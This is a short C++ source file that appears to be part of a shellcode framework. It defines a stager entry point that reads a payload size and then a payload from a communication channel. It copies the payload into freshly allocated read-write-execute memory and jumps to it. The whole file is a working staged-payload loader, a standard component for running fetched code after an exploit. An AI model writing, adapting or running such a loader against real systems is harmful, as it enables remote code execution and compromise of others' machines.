#include <factory.h>

#include "pico/channel.cc"
#include "pico/memory.cc"

using namespace Pico;

typedef __attribute__((noreturn)) void (* shellcode)(void);

SHELLCODE_ENTRY
{
    Channel channel;
    unsigned short buffer_size = 0;

    /* Read the size of the input buffer (2 bytes). */
    channel.recv(&buffer_size, sizeof(buffer_size));

    /* Allocate memory for shellcode. */
    void *memory = Memory::allocate(buffer_size, Memory::READ | Memory::WRITE | Memory::EXEC);

    /* Read shellcode in memory. */
    channel.recv(memory, buffer_size);

    /* Execute shellcode. */
    ((shellcode) memory)();
}
